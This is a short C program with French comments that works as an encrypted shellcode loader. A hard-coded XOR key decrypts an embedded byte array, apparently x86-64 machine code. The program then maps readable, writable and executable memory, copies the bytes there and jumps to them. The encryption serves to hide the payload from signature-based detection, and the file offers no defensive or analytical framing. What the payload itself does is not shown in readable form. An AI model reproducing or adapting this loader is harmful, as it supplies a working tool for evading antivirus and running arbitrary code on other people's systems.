#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

// Définir la clé de chiffrement
const char key[] = "secretkey";

// Définir le shellcode chiffré
char encrypted_shellcode[] = "\x3b\x54\xb1\x3a\x54\xb4\x23\x54\x86\x3b\x54\xaa\x3a\x54\x82\x23\x54\xa2\xc3\x4c\x23\xc5\x67\x34\xdd\x64\xcb\x75\x6a\x66\x3b\xec\xb4\x23\xe6\x95\x7b\xa3\x67\x56\x67\x12\xac\x21\x5d\x71\x74\x3f\xb5\x21\x50\x6f\x1a\x78\x72\x64\x2b\xfb\x83\xc6\x7b\x24\x29\x2c\xd5\x49\x7d\x60\xc4\x4a\x24\x29\x2c\x2d\x52\x84\x6a\x71\xdb\x44\x38\x23\x3a\x23\xc4\x64\x7b\x6e\xd5\x58\x32\x35\x3c\x32\xd3\x76\x64\x60\x31\x42\x93\x35\x3a\xda\x5b\x09\x0c\x17\x5c\x4a\x10\x1a\x32\x20\x34\xd5\x42\xea\x6a\x66";

// Fonction de déchiffrement XOR
void xor_decrypt(char *data, size_t data_len, const char *key, size_t key_len) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}
void main() {
    // Taille du shellcode chiffré
    size_t shellcode_len = sizeof(encrypted_shellcode) - 1; // Exclure le caractère nul final

    // Déchiffrer le shellcode
    xor_decrypt(encrypted_shellcode, shellcode_len, key, sizeof(key) - 1);

    // Afficher la longueur du shellcode déchiffré
    printf("shellcode length: %zu\n", shellcode_len);

    // Allouer de la mémoire exécutable
    void *a = mmap(0, shellcode_len, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);

    // Copier le shellcode déchiffré dans la mémoire allouée et l'exécuter
    ((void (*)(void)) memcpy(a, encrypted_shellcode, shellcode_len))();
}
